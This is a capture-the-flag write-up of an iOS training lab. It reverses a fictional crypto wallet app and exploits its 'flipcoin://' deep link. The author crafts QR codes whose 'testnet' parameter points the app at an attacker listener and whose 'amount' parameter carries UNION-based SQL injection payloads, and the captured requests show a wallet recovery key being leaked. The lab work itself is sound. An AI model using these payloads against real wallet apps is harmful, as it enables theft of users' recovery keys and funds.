**Description**: Welcome to the **iOS Application Security Lab: SQL Injection Challenge**. The challenge is centered around a fictious crypto currency flipcoin and its wallet Flipcoin Wallet. The Flipcoin wallet is an offline wallet giving users full ownership of their digital assets. The challenge highlights the potential entrypoints that can lead to further serious vulnerabilities including SQL injection. As an attacker, your aim is to craft an exploit that can be used to attack other users of the application.

**Download**: https://lautarovculic.com/my_files/flipCoin-wallet.ipa
**Link:** https://www.mobilehackinglab.com/path-player?courseid=lab-flipcoin-wallet

![[flipCoin1.png]]

Install an **IPA** file can be difficult.
So, for make it more easy, I made a YouTube video with the process using **Sideloadly**.
**LINK**: https://www.youtube.com/watch?v=YPpo9owRKGE

**NOTE**: If you have problems with the keyboard and UI (buttons) when you need to hide it on a physical device, you can fix this problem by using the `KeyboardTools` by `@CrazyMind90` found in the Sileo app store.

Once you have the app installed, let's proceed with the challenge.
Unzip the **`.ipa`** file and inside we can find the **`Info.plist`** file.
Here we can found an interesting info
```XML
<array>
    <dict>
        <key>CFBundleTypeRole</key>
        <string>Editor</string>
        <key>CFBundleURLName</key>
        <string>com.mobilehackinglab.flipcoinwallet</string>
        <key>CFBundleURLSchemes</key>
        <array>
            <string>flipcoin</string>
        </array>
    </dict>
</array>
```

This is an **scheme** (for DeepLinks), which is handled with **`flipcoin`** word.
Let's explore some related methods in the *binary file*.
```bash
strings 'Flipcoin Wallet' | grep URL
```

Output:
```bash
URLsForDirectory:inDomains:
application:handleOpenURL:
application:openURL:sourceApplication:annotation:
application:openURL:options:
application:handleEventsForBackgroundURLSession:completionHandler:
openURL:options:completionHandler:
scene:openURLContexts:
```

We can see methods related to *URL handling*.
What's is this?
`application:openURL:sourceApplication:annotation:` -> for < iOS 9
`application:openURL:options:` -> for > iOS 10
But *since iOS 13* we use **UISceneDelegate**

`openURL:options:completionHandler:`
Used in multi-windows apps, UIScene, where each "*scene*" handle URL events by separated.
Its used with **universal links**

`scene:openURLContexts:`
It's a recommended method in > iOS 13 for URL handling when app have many active scenes.
This *replace* `application:openURL:options:`.
Params:
	- `scene`: Active scene where URL was opened.
	- `openURLContext`: A *NSSet* with open URLs.

#### Scene != Activity
- An **Activity** in Android is a full screen with its own lifecycle.
- A **Scene** in iOS is more flexible, it can represent a window, a tab, or a part of the UI in multi-window or multi-tasking apps.

Let's use `otool` for decompile the methods, and search for them
```bash
otool -tv 'Flipcoin Wallet' | grep openURL
```

Output:
```bash
_$s15Flipcoin_Wallet13SceneDelegateC5scene_15openURLContextsySo7UISceneC_ShySo16UIOpenURLContextCGtF:
_$s15Flipcoin_Wallet13SceneDelegateC5scene_15openURLContextsySo7UISceneC_ShySo16UIOpenURLContextCGtFSSSgs5UInt8VXEfU_:
_$s15Flipcoin_Wallet13SceneDelegateC5scene_15openURLContextsySo7UISceneC_ShySo16UIOpenURLContextCGtFTo:
0000000100018654	bl	_$s15Flipcoin_Wallet13SceneDelegateC5scene_15openURLContextsySo7UISceneC_ShySo16UIOpenURLContextCGtF
```

Let's stop in this method
```bash
_$s15Flipcoin_Wallet13SceneDelegateC5scene_15openURLContextsySo7UISceneC_ShySo16UIOpenURLContextCGtF
```
Clearly this is a **Swfit app**
Here's the *structure*
- `SceneDelegateC` → Refers to the *SceneDelegate* of the app (handles scenes in iOS 13+).
- `scene_15openURLContexts` → Indicates that *it receives a UIScene* and a `NSSet<UIOpenURLContext>`, which is the method for *handling deep links in SceneDelegate*.
- `So7UISceneC_ShySo16UIOpenURLContextCGtF` → It is using an *NSSet* of *UIOpenURLContext*, which confirms that it handles URLs opened from external links.

An NSSet can be look as an simple *set* that we can see in python.

You can see more information about the method with
```bash
otool -tv 'Flipcoin Wallet' | grep -A 50 s15Flipcoin_Wallet13SceneDelegateC5scene_15openURLContextsySo7UISceneC_ShySo16UIOpenURLContextCGtFTo
```

Output:
```bash
_$s15Flipcoin_Wallet13SceneDelegateC5scene_15openURLContextsySo7UISceneC_ShySo16UIOpenURLContextCGtFTo:
00000001000185f0	sub	sp, sp, #0x50
00000001000185f4	stp	x20, x19, [sp, #0x30]
00000001000185f8	stp	x29, x30, [sp, #0x40]
00000001000185fc	add	x29, sp, #0x40
0000000100018600	mov	x20, x0
0000000100018604	str	x20, [sp, #0x20]
0000000100018608	mov	x0, x2
000000010001860c	stur	x0, [x29, #-0x18]
0000000100018610	str	x3, [sp, #0x18]
0000000100018614	bl	0x1000201fc ; symbol stub for: _objc_retain
0000000100018618	ldr	x0, [sp, #0x18]
000000010001861c	bl	0x1000201fc ; symbol stub for: _objc_retain
0000000100018620	mov	x0, x20
0000000100018624	bl	0x1000201fc ; symbol stub for: _objc_retain
0000000100018628	mov	x0, #0x0
000000010001862c	bl	_$sSo16UIOpenURLContextCMa
0000000100018630	str	x0, [sp, #0x8]
0000000100018634	bl	_$sSo16UIOpenURLContextCSo8NSObjectCSH10ObjectiveCWl
0000000100018638	ldr	x1, [sp, #0x8]
000000010001863c	mov	x2, x0
0000000100018640	ldr	x0, [sp, #0x18]
0000000100018644	bl	0x100020184 ; symbol stub for: _$sSh10FoundationE36_unconditionallyBridgeFromObjectiveCyShyxGSo5NSSetCSgFZ
0000000100018648	mov	x1, x0
000000010001864c	ldur	x0, [x29, #-0x18]
0000000100018650	str	x1, [sp, #0x10]
0000000100018654	bl	_$s15Flipcoin_Wallet13SceneDelegateC5scene_15openURLContextsySo7UISceneC_ShySo16UIOpenURLContextCGtF
0000000100018658	ldr	x0, [sp, #0x10]
000000010001865c	bl	0x100020628 ; symbol stub for: _swift_bridgeObjectRelease
0000000100018660	ldr	x0, [sp, #0x18]
0000000100018664	bl	0x1000201e4 ; symbol stub for: _objc_release
0000000100018668	ldr	x0, [sp, #0x20]
000000010001866c	bl	0x1000201e4 ; symbol stub for: _objc_release
0000000100018670	ldur	x0, [x29, #-0x18]
0000000100018674	bl	0x1000201e4 ; symbol stub for: _objc_release
0000000100018678	ldp	x29, x30, [sp, #0x40]
000000010001867c	ldp	x20, x19, [sp, #0x30]
0000000100018680	add	sp, sp, #0x50
0000000100018684	ret
```

Now we need know how this method works, for that, we need use **Ghidra**.
Load the binary file and let's search for the method!

![[flipCoin2.png]]
This is an insane method which contains > 1000 code lines.
Searching in the C code, we can notice something interesting.
```C
[...]
[...]
[...]
else {
    local_438[5] = local_438[5] + 1;
    local_6b8 = &PTR_s_v24@0:8@"UIScene"16_10002d000;
    UVar14.unknown = local_4d8;
    _objc_msgSend(local_4d8, "URL");
    _objc_retainAutoreleasedReturnValue();
    local_6d0 = UVar14.unknown;
    Foundation::URL::$_unconditionallyBridgeFromObjectiveC(UVar14);
    (*local_4c8)(UVar16.unknown, local_2d8, local_380);
    SVar36 = Foundation::URL::get_absoluteString(UVar16);
    pSVar6 = local_440;
    local_6d8 = SVar36.bridgeObject;
    local_6e8 = SVar36.str;
    (*local_4c0)(local_350, local_380);
    (*local_4c0)(local_2d8, local_380);
    local_6ac = 1;
    SVar36 = Swift::String::init("amount", 6, 1);
    local_6e0 = SVar36.bridgeObject;
    pcVar32 = local_6e8;
    pvVar24 = local_6d8;
    (**(code **)((*(uint *)pSVar6 & *local_428) + 0x98))(local_6e8, local_6d8, SVar36.str);
    UVar16.unknown = local_350;
    local_6c8 = pcVar32;
    local_6c0 = pvVar24;
    _swift_bridgeObjectRelease(local_6e0);
    _swift_bridgeObjectRelease(local_6d8);
    _objc_release(local_6d0);
    local_108 = local_6c8;
    local_100 = local_6c0;
    UVar14.unknown = local_4d8;
    _objc_msgSend(local_4d8, local_6b8[0x39]);
    _objc_retainAutoreleasedReturnValue();
    local_690 = UVar14.unknown;
    Foundation::URL::$_unconditionallyBridgeFromObjectiveC(UVar14);
    (*local_4c8)(UVar16.unknown, local_2d8, local_380);
    SVar36 = Foundation::URL::get_absoluteString(UVar16);
    pSVar6 = local_440;
    local_698 = SVar36.bridgeObject;
    local_6a8 = SVar36.str;
    (*local_4c0)(local_350, local_380);
    (*local_4c0)(local_2d8, local_380);
    SVar36 = Swift::String::init("testnet", 7, (byte)local_6ac & 1);
    pcVar32 = (char *)SVar36.bridgeObject;
    pcVar20 = local_6a8;
    pvVar24 = local_698;
    local_6a0 = pcVar32;
    (**(code **)((*(uint *)pSVar6 & *local_428) + 0x98))(local_6a8, local_698, SVar36.str);
    local_688 = pcVar20;
    local_680 = pvVar24;
    _swift_bridgeObjectRelease(local_6a0);
    _swift_bridgeObjectRelease(local_698);
    _objc_release(local_690);
    _swift_bridgeObjectRetain(local_680);
    local_128 = local_688;
    local_120 = local_680;
    if (local_680 == (void *)0x0) {
        ___profc_/Users/BH32SJ/Downloads/flipcoin-wallet-main/challenge/Flipcoin_Wallet/SceneDelegate.swift:$s15Flipcoin_Wallet13SceneDelegateC5scene_15openURLContextsySo7UISceneC_ShySo16UIOpenURLContextCGtFSSyKXEfu0_
            = ___profc_/Users/BH32SJ/Downloads/flipcoin-wallet-main/challenge/Flipcoin_Wallet/SceneDelegate.swift:$s15Flipcoin_Wallet13SceneDelegateC5scene_15openURLContextsySo7UISceneC_ShySo16UIOpenURLContextCGtFSSyKXEfu0_
            + 1;
        local_118 = Swift::String::init("https://mhl.pages.dev:8545", 0x1a, 1);
    }
}
[...]
[...]
[...]
```
This code (can be seen at the end of the fragment) correspond to `SceneDelegate.swift`
This file in an iOS app define how app **handle multiple windows (scenes)**.
- Manages the **life cycle of the scene** (window)
- Responds to **events such as opening URLs**, restoring app state, or handling external connections
- Runs together with `AppDelegate.swift`, but handles each “scene” individually

We can interpret the code in few words:
1. Extracts the **URL from the `UIOpenURLContext`**
2. Gets the **value of certain parameters**, such as **`amount`** and **`testnet`**, from the **URL**.
3. **Validates if `testnet` is present,** and *if not*, allocates https://mhl.pages.dev:8545 as *fallback*
4. *Frees objects in memory to avoid leaks*

If we go to **Receive** functionality in app, we can see that a QR code is generated.
Also, in **Send** functionality, we can notice that *our wallet* is
`0x252B2Fff0d264d946n1004E581bb0a46175DC009`

The deeplink looks like
```bash
flipcoin://0x252B2Fff0d264d946n1004E581bb0a46175DC009?amount=0.001&testnet=https://mhl.pages.dev:8545
```

Let's generate an QR code with **qrencode** tool.
```bash
qrencode "flipcoin://0x252B2Fff0d264d946n1004E581bb0a46175DC009?amount=0.0001&testnet=http://192.168.1.75:8081" -o QR.png
```

Then, use **nc** tool for receive the *incoming connections*
```bash
nc -nlv 8081
```
If we *scan the QR code*, we can see this request
```HTTP
POST / HTTP/1.1
Host: 192.168.1.75:8081
Content-Type: application/json
Connection: keep-alive
Accept: application/json
User-Agent: Flipcoin%20Wallet/1 CFNetwork/1410.1 Darwin/22.6.0
Content-Length: 175
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Accept-Encoding: gzip, deflate

{
    "jsonrpc": "2.0",
    "method": "web3_sha3",
    "params": [
        "0x252B2Fff0d264d946n1004E581bb0a46175DC009",
        "111120a58098a188ff60e0949d3102e9cc38b61701065c72f8aed205e76f245e"
    ],
    "id": 1
}
```

Is interesting that we have the **ID** param. So, let's inspect the database implementation (due to this is an SQLi challenge).

Well, searching code about the DB implementation, I get the flag
![[flipCoin3.png]]
In the `createWallet` (`bool __thiscall Flipcoin_Wallet::DatabaseHelper::createWallets(DatabaseHelper *this)`)

But, we need **exploit the SQLi**, so, we need know where and how the `.sqlite` file is create.
So, we can use **objection** tool.
Attach your device via USB and while app is running, execute
```bash
objection -g "Flipcoin Wallet" explore
```
Then, with `env` command you will get all `dir` of the app.
```bash
Name               Path
-----------------  ---------------------------------------------------------------------------------------------------
BundlePath         /private/var/containers/Bundle/Application/0EE311ED-CAC1-4CF6-AF6E-CFE426AC0812/Flipcoin Wallet.app
CachesDirectory    /var/mobile/Containers/Data/Application/813E5422-D8C7-41EF-B7C3-BD53ED85D01C/Library/Caches
DocumentDirectory  /var/mobile/Containers/Data/Application/813E5422-D8C7-41EF-B7C3-BD53ED85D01C/Documents
LibraryDirectory   /var/mobile/Containers/Data/Application/813E5422-D8C7-41EF-B7C3-BD53ED85D01C/Library
```

Inside of **Documents** folder, we can found the **`.sqlite`** file.
```bash
...ab.Flipcoin-Wallet6.YX4C7J2RLK on (iPhone: 16.7.10) [usb] # ls
NSFileType  Perms  NSFileProtection                      Read  Write  Owner         Group         Size      Creation                   Name
----------  -----  ------------------------------------  ----  -----  ------------  ------------  --------  -------------------------  -------------------------
Regular       420  CompleteUntilFirstUserAuthentication  True  True   mobile (501)  mobile (501)  12.0 KiB  2025-02-08 19:22:17 +0000  your_database_name.sqlite

Readable: True  Writable: True
```

We can download the database with this *objection commnad*
```bash
file download your_database_name.sqlite
```

Then, inspect the database scheme
```bash
sqlite3 your_database_name.sqlite
SQLite version 3.43.2 2023-10-10 13:08:14
Enter ".help" for usage hints.
sqlite> .headers on
sqlite> .tables
wallet
sqlite> select * from wallet;
id|address|currency|amount|recovery_key
1|0x252B2Fff0d264d946n1004E581bb0a46175DC009|flipcoin|0.3654|FLAG{fl1p_d4_c01nz}}
2|1W5vKAAKmBAjjtpCkGZREjgEGjrbwERND|bitcoin|15.26|BATTLE TOADS WRITING POEMS
```

We can see that we have `id`, `address`, `currency`, `amount`, `recovery_key` parameters.
I think that the *sqli* is in the **amount** param.
So, let's try generate a *new QR* for test it.

```bash
qrencode "flipcoin://0x252B2Fff0d264d946n1004E581bb0a46175DC009?amount=0.0001/**/AND/**/id=2;--&testnet=http://192.168.1.75:8081" -o QR3.png
```
Remember set **nc** listener.
Response:
```HTTP
POST / HTTP/1.1
Host: 192.168.1.75:8081
Content-Type: application/json
Connection: keep-alive
Accept: application/json
User-Agent: Flipcoin%20Wallet/1 CFNetwork/1410.1 Darwin/22.6.0
Content-Length: 166
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Accept-Encoding: gzip, deflate

'{
    "jsonrpc": "2.0",
    "method": "web3_sha3",
    "params": [
        "1W5vKAAKmBAjjtpCkGZREjgEGjrbwERND",
        "2096edb8979a55630f3b214c21861f0e9884db4900edcb9474aacbc68f3f5e85"
    ],
    "id": 1
}'
```

The SQLi works! because we get different wallet params.
So, after many tries, this **UNION Based** payload works
```bash
qrencode "flipcoin://0x252B2Fff0d264d946n1004E581bb0a46175DC009?amount=0.0001/**/AND/**/id=10/**/UNION/**/SELECT/**/10,(SELECT/**/recovery_key/**/FROM/**/wallet/**/WHERE/**/id=2),3,4,5/**/LIMIT/**/1;--&testnet=http://192.168.1.75:8081" -o QR6.png
```
We receive
```HTTP
POST / HTTP/1.1
Host: 192.168.1.75:8081
Content-Type: application/json
Connection: keep-alive
Accept: application/json
User-Agent: Flipcoin%20Wallet/1 CFNetwork/1410.1 Darwin/22.6.0
Content-Length: 159
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Accept-Encoding: gzip, deflate

'{
    "jsonrpc": "2.0",
    "method": "web3_sha3",
    "params": [
        "BATTLE TOADS WRITING POEMS",
        "6803b53958e83e7d5f47e978b15b50974fd795e01915f4ff40644f5a0fca4a26"
    ],
    "id": 1
}'
```

We get successfully the **recovery_key** of *the account 2*!
**`BATTLE TOADS WRITING POEMS`**
Also, if you want get the '*flag*' you just need *change the `WHERE` id=2 by id=1*.

I hope you found it useful (: